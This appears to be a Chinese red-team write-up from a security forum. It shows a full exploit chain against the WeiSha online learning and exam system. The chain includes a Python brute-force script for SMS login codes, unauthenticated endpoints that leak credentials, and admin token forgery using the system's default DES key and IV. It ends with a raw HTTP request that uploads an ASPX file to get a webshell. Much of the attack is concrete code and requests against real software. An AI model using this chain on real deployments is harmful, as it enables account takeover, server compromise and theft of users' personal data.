# 一次攻防演练从未授权访问到getshell过程-先知社区

> **来源**: https://xz.aliyun.com/news/18462  
> **文章ID**: 18462

---

# 信息搜集

首先从目标主页进行信息搜集，发现授权文件

![image.png](images/img_18462_000.png)

经过一番查找发现是《微厦在线学习考试系统》的特征  
项目地址：<https://github.com/weishakeji/LearningSystem>

查了一下公开的漏洞，可能是因为比较冷门，基本没有，后来cnvd查了下发现洞还挺多的

![image.png](images/img_18462_001.png)

但都是一些比较老的，也拿不到poc，遂尝试自行挖掘

# 前台任意用户登录

前台存在短信登录功能，我们短信登录抓包，调试分析前端源码

![image.png](images/img_18462_002.png)

发现js存在一个前端校验验证码的过程，这里几乎可以确定能绕过

后续分析出短信登录校验逻辑为：

前端校验验证码，md5(手机号+6位验证码) = 短信验证码响应包的result值

抓包观察验证码响应包

![image.png](images/img_18462_003.png)

这里的result就是密文，搓个脚本直接爆破

```
import hashlib

# 固定前缀
prefix = "18xxxxxxx29"

# 目标 MD5
target_hash = "xxxxxxxxxxxxxxxxxxxxxxxxx"

# 暴力破解六位验证码
for i in range(1000000):
    code = f"{i:06d}"
    candidate = prefix + code
    hash_result = hashlib.md5(candidate.encode()).hexdigest()
    if hash_result == target_hash:
        print(f"[+] Found match: {candidate}")
        break
else:
    print("[-] No match found.")
```

![image.png](images/img_18462_004.png)

后六位就是验证码

![image.png](images/img_18462_005.png)

成功登录

进入后台后抓包还发现获取个人信息接口

![image.png](images/img_18462_006.png)

平行越权，证明可控制接近1w条账号

# 未授权访问

下载源码审计，发现该系统存在大量未授权接口，我们这里直接看重点

![image.png](images/img_18462_007.png)

这个接口会获取到当下岗位员工的所有信息，包括密码密文以及一些后端权限校验需要用到的随机值

可以看到是没有划分任何权限的，直接遍历岗位id即可

![image.png](images/img_18462_008.png)

通过官方文档我们可以知道，该系统权限一共分为三个级别：

![image.png](images/img_18462_009.png)

super就是超级管理员，但这里我们获取到的密码密文（Acc\_Pw）是解不出来的，只能尝试其他办法，参考后续分析

# 任意用户伪造（组合拳）

在上个未授权访问中，我们注意到，除了密文，还有一个值得注意的参数Acc\_CheckUID，从命名我们就能大致猜出肯定是用于权限校验，所以接下来我们详细分析一下鉴权流程

首先用官方的测试站点登录super用户，了解到用户认证字段为Authorization，登录成功后重点关注响应包的这两个字段

![image.png](images/img_18462_010.png)

登录后的认证字段内容如下：

![image.png](images/img_18462_011.png)

![image.png](images/img_18462_012.png)

格式如下：

```
base64[ {路径}:{emp}{Acc_Pw字段} ]
```

> 注意这里，演示站的版本不知道是因为最新还是什么，和源码搭建的不一样，经过测试低版本没有emp，直接跟Acc\_Pw字段

也就是说，我们只要拿到Acc\_Pw的生成逻辑就可以直接伪造用户，源码中跟进到管理员登录控制器

Song.ViewData/Methods/Admin.cs

![image.png](images/img_18462_013.png)

这里可以看到登录成功之后会直接查询帐号信息返回帐号对象，最后Acc\_Pw是通过LoginAdmin的login方法程生成的，跟进login方法

Song.ViewData/Helper/LoginAdmin.cs

![image.png](images/img_18462_014.png)

这里生成了一个随机的uid存到数据库，也就是CheckUID，然后调用了\_generate\_checkcode方法生成Acc\_Pw，跟进

![image.png](images/img_18462_015.png)

校验码的格式如下：

```
//校验码,依次为：标识,id,角色,时效,识别码
string checkcode = "{0},{1},{2},{3},{4}";
string role = "admin";      //角色

checkcode = string.Format(checkcode, keyname, accid, role, exp.ToString("yyyy-MM-dd HH:mm:ss"), uid);
```

其中keyname为Web.Config中Admin相关配置，默认为**emp**

![image.png](images/img_18462_016.png)

以默认的super帐号为例，即：

emp,1,admin,2026-04-18 03:50:28,c4ca4238a0b923820dcc509a6f75849b

随后调用了WeiSha.Core中的EncryptForDES方法，secretkey也在Web.Config中，默认为**rmYk0h3F**，反编译跟进核心模块

Lib/WeiSha.Core.dll

![image.png](images/img_18462_017.png)

可以看到加密模式为DES-CBC，向量为十六进制的1234567890abcdef，用一个正确的Acc\_Pw来解密验证一下

![image.png](images/img_18462_018.png)

成功解密，总结一下生成逻辑

```
校验码（keyname, accid, role, exp.ToString("yyyy-MM-dd HH:mm:ss"), uid）
Acc_Pw = DES加密（校验码，key，iv）
base64[ {路径}:{emp}{Acc_Pw字段} ]	//p.s.低版本没有emp
```

到这里我们可以尝试通过获取到的CheckUID来伪造用户了

我们来伪造一个Acc\_Pw来构造Authorization，通过管理员信息泄漏得到CheckUID：

![image.png](images/img_18462_019.png)

能成功获取到数据，抓包添加这个认证请求头

![image.png](images/img_18462_020.png)

刷新成功进入后台，获取到4k条用户敏感信息

## 普通用户

和管理员类似，不同接口，不同密钥，不同前缀，格式有所差别，可以参考源码

Song.ViewData/Methods/Account.cs

Song.ViewData/Helper/LoginAdmin.cs

# 任意文件上传getshell

在发现任意用户伪造之前，我就注意到了一个文件上传接口

一共发现了好几个文件上传接口，但都进行了过滤，唯独这一个

接口：<https://localhost/api/v2/Upload/Chunked>

![image.png](images/img_18462_021.png)

在该系统里面，Admin和SuperAdmin都对应超级管理员，所以我们前面花了较多时间在伪造用户上面

这个接口是用来大文件分块传输的，大致分析了一下参数，直接可以构造上传数据包：

```
POST /api/v2/Upload/Chunked?pathkey=Temp&filename=test.aspx&total=1&index=1&uid=b917805a-0d96-452b-8621-c11c5b207b05 HTTP/1.1
Host: xxxxxxx
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br, zstd
Accept: */*
Connection: keep-alive
Authorization: Basic xxxxxxxxxxxxxxxxxxxxxxxx
X-Custom-Header: WeishaKeji
Encrypt: false
Content-Length: 3410
Content-Type: multipart/form-data; boundary=3723a6409b6bb95d291054e27c366fd4

--3723a6409b6bb95d291054e27c366fd4
Content-Disposition: form-data; name="file"; filename="1.b917805a-0d96-452b-8621-c11c5b207b05"

asp
--3723a6409b6bb95d291054e27c366fd4--
```

![image.png](images/img_18462_022.png)

![image.png](images/img_18462_023.png)

成功getshell，后续就是一些内网的成果，这里不做描述

# 总结

基本没怎么审过.NET，花了大量时间去结合实际环境摸接口，菜鸡一个，大佬们见笑！
